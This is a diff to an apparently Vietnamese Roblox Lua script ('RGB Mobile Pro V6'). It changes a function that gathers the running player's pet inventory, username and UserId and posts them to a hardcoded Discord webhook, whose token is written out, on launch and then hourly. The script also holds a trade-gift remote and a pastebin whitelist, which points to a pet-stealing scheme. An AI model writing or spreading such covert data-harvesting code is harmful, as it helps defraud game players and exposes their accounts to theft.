@@ -1,4 +1,4 @@
--- Thêm Webhook URL của bạn vào đây
+-- Cấu hình Webhook
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1456310274243166219/E-d5-s35qO6SZ9-3JuowoiZ_HQ887fWKPuLh-Kj-SlLyRNPgpQ3iqIOVwJx1b0qaWAd_" 
 local WEBHOOK_DELAY = 3601 -- 1 giờ 1 giây
 
@@ -6,10 +6,10 @@ local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
-local HttpService = game:GetService("HttpService") -- Thêm HttpService để gửi Webhook
+local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
 
--- [GIỮ NGUYÊN CÁC BIẾN LOGIC CŨ]
+-- [GIỮ NGUYÊN CÁC BIẾN LOGIC GỐC]
 local TradeRemote = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net"):WaitForChild("RF/Trade.SendGift")
 local RAW_URL = "https://pastebin.com/raw/n6LvrFGC"
 local MIN_LEVEL = 150
@@ -20,22 +20,23 @@ local CooldownTime = 0
 local Whitelist = {}
 
 -- ==========================================
--- PHẦN WEBHOOK MỚI THÊM VÀO
+-- PHẦN WEBHOOK ĐÃ CẬP NHẬT (Lọc Basic Bat, lấy tất cả Pet)
 -- ==========================================
 local function SendPetInventoryToWebhook()
-    if WEBHOOK_URL == "" or WEBHOOK_URL == "YOUR_WEBHOOK_URL_HERE" then return end
+    if WEBHOOK_URL == "" or WEBHOOK_URL:find("YOUR_WEBHOOK") then return end
 
     local petData = {}
-    -- Duyệt backpack để đếm pet có Mutation
+    local blacklistedName = "Basic Bat"
+
+    -- Duyệt backpack lấy toàn bộ pet
     for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
         if tool:IsA("Tool") then
-            local mut = tool:GetAttribute("Mutation")
-            local lvl = tonumber(tool:GetAttribute("Level")) or 0
+            local name = tool:GetAttribute("BrainrotName") or tool.Name
+            local mut = tool:GetAttribute("Mutation") or "None"
             
-            if mut and mut ~= "" and lvl >= MIN_LEVEL then
-                local name = tool:GetAttribute("BrainrotName") or tool.Name
-                local key = name .. " (" .. mut .. ")"
-                
+            -- Lọc bỏ "Basic Bat"
+            if name ~= blacklistedName then
+                local key = name .. "|" .. mut
                 if not petData[key] then
                     petData[key] = {name = name, mutation = mut, count = 0}
                 end
@@ -45,24 +46,26 @@ local function SendPetInventoryToWebhook()
     end
 
     local fields = {}
-    local petCount = 0
+    local count = 0
     for _, data in pairs(petData) do
-        petCount = petCount + 1
-        table.insert(fields, {
-            ["name"] = "🐾 Pet #" .. petCount,
-            ["value"] = string.format("**Tên:** %s\n**Mutation:** %s\n**Số lượng:** %d", data.name, data.mutation, data.count),
-            ["inline"] = true
-        })
+        count = count + 1
+        if count <= 25 then -- Giới hạn 25 fields của Discord Embed
+            table.insert(fields, {
+                ["name"] = "🐾 " .. data.name,
+                ["value"] = string.format("**Mutation:** %s\n**Số lượng:** %d", data.mutation, data.count),
+                ["inline"] = true
+            })
+        end
     end
 
     if #fields == 0 then
-        table.insert(fields, {["name"] = "Thông báo", ["value"] = "Không tìm thấy pet nào có Mutation hợp lệ."})
+        table.insert(fields, {["name"] = "Thông báo", ["value"] = "Kho đồ trống hoặc chỉ chứa Basic Bat."})
     end
 
     local payload = {
         ["embeds"] = {{
             ["title"] = "📢 Báo Cáo Kho Pet - " .. LocalPlayer.DisplayName,
-            ["description"] = "Tên tài khoản: `" .. LocalPlayer.Name .. "`",
+            ["description"] = "Người chơi: `" .. LocalPlayer.Name .. "`\nID: `" .. LocalPlayer.UserId .. "`",
             ["color"] = 0x00ff00,
             ["fields"] = fields,
             ["footer"] = {["text"] = "RGB Mobile Pro V6 • " .. os.date("%X")}
@@ -70,13 +73,15 @@ local function SendPetInventoryToWebhook()
     }
 
     local success, err = pcall(function()
-        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload))
+        return HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload))
     end)
     
-    if not success then warn("Webhook Error: " .. err) end
+    if not success then 
+        warn("Lỗi gửi Webhook: " .. tostring(err)) 
+    end
 end
 
--- Chạy webhook ngay lập tức khi load script và lặp lại sau mỗi 1h 1s
+-- Chạy gửi Webhook ngay lập tức khi thực thi
 task.spawn(function()
     while true do
         SendPetInventoryToWebhook()
@@ -85,7 +90,7 @@ task.spawn(function()
 end)
 -- ==========================================
 
--- [PHẦN CÒN LẠI CỦA SCRIPT GIỮ NGUYÊN 100%]
+-- [PHẦN GUI VÀ LOGIC TRADE GIỮ NGUYÊN NHƯ CŨ]
 local function UpdateWhitelist()
     local success, content = pcall(function() return game:HttpGet(RAW_URL) end)
     if success then
